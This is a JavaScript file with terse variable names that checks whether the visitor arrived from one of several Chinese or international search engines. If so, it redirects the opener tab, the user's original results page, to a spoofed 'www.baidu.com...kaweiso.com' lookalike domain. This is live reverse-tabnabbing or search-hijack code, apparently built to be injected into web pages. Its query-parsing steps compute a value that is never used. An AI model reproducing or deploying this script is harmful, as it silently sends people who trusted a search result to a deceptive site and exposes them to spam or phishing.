function a(i, j) {
    var k = "?wd=";
    var l = "&wd=";
    var m = "###";
    var n = "&";
    var o = i.indexOf(k);
    if (o == -1) {
        o = i.indexOf(l);
    }
    ;
    i = i.substring(o + 4, i.length);
    var o = i.indexOf(m);
    if (o == -1) {
        o = i.indexOf(n);
    }
    ;
    if (o != -1) {
        i = i.substring(0, o);
    }
    ;
    if (navigator.userAgent.indexOf("MSIE") != -1) {
        window.opener.document.location = j;
    } else {
        window.opener.location.href = j;
    }
};function b(i, j) {
    var k = "?q=";
    var l = "&q=";
    var m = "###";
    var n = "&";
    var o = i.indexOf(k);
    if (o == -1) {
        o = i.indexOf(l);
    }
    ;
    i = i.substring(o + 3, i.length);
    var o = i.indexOf(m);
    if (o == -1) {
        o = i.indexOf(n);
    }
    ;
    if (o != -1) {
        i = i.substring(0, o);
    }
    ;
    if (navigator.userAgent.indexOf("MSIE") != -1) {
        window.opener.document.location = j;
    } else {
        window.opener.location.href = j;
    }
};function c(i, j) {
    var k = "?query=";
    var l = "&query=";
    var m = "###";
    var n = "&";
    var o = i.indexOf(k);
    if (o == -1) {
        o = i.indexOf(l);
    }
    ;
    i = i.substring(o + 7, i.length);
    var o = i.indexOf(m);
    if (o == -1) {
        o = i.indexOf(n);
    }
    ;
    if (o != -1) {
        i = i.substring(0, o);
    }
    ;
    if (navigator.userAgent.indexOf("MSIE") != -1) {
        window.opener.document.location = j;
    } else {
        window.opener.location.href = j;
    }
};function d(i, j) {
    var k = "?w=";
    var l = "&w=";
    var m = "###";
    var n = "&";
    var o = i.indexOf(k);
    if (o == -1) {
        o = i.indexOf(l);
    }
    ;
    i = i.substring(o + 3, i.length);
    var o = i.indexOf(m);
    if (o == -1) {
        o = i.indexOf(n);
    }
    ;
    if (o != -1) {
        i = i.substring(0, o);
    }
    ;
    if (navigator.userAgent.indexOf("MSIE") != -1) {
        window.opener.document.location = j;
    } else {
        window.opener.location.href = j;
    }
};function e(i, j) {
    var k = "?q=";
    var l = "&q=";
    var m = "###";
    var n = "&";
    var o = i.indexOf(k);
    if (o == -1) {
        o = i.indexOf(l);
    }
    ;
    i = i.substring(o + 3, i.length);
    var o = i.indexOf(m);
    if (o == -1) {
        o = i.indexOf(n);
    }
    ;
    if (o != -1) {
        i = i.substring(0, o);
    }
    ;
    if (navigator.userAgent.indexOf("MSIE") != -1) {
        window.opener.document.location = j;
    } else {
        window.opener.location.href = j;
    }
};function f(i, j) {
    var k = "?kw=";
    var l = "&kw=";
    var m = "###";
    var n = "&";
    var o = i.indexOf(k);
    if (o == -1) {
        o = i.indexOf(l);
    }
    ;
    i = i.substring(o + 4, i.length);
    var o = i.indexOf(m);
    if (o == -1) {
        o = i.indexOf(n);
    }
    ;
    if (o != -1) {
        i = i.substring(0, o);
    }
    ;
    if (navigator.userAgent.indexOf("MSIE") != -1) {
        window.opener.document.location = j;
    } else {
        window.opener.location.href = j;
    }
};var g = "http://www.baidu.com.1253jh9856lk5124hg6352op5566hgyg.kaweiso.com/s/?wd=%e7%81%b5%e5%88%9b%e7%bd%91%e7%bb%9c&pcid=2d577d5f-4314-4cdb-ae6b-92e6a21ed01c";
var times = 0;
var h = document.referrer;
h = h.toLowerCase();
if (h.indexOf("baidu.com/") != -1) {
    a(h, g);
} else if (h.indexOf("google.com/") != -1 || h.indexOf("google.com.hk/") != -1) {
    b(h, g);
} else if (h.indexOf("sogou.com/") != -1) {
    c(h, g);
} else if (h.indexOf("soso.com/") != -1) {
    d(h, g);
} else if (h.indexOf("yahoo.cn/") != -1) {
    e(h, g);
} else if (h.indexOf("youdao.com/") != -1) {
    e(h, g);
} else if (h.indexOf("cn.bing.com/") != -1) {
    e(h, g);
} else if (h.indexOf("vnet.cn/") != -1) {
    f(h, g);
} else if (h.indexOf("so.com/") != -1) {
    e(h, g);
} else if (h.indexOf("haosou.com/") != -1) {
    e(h, g);
}
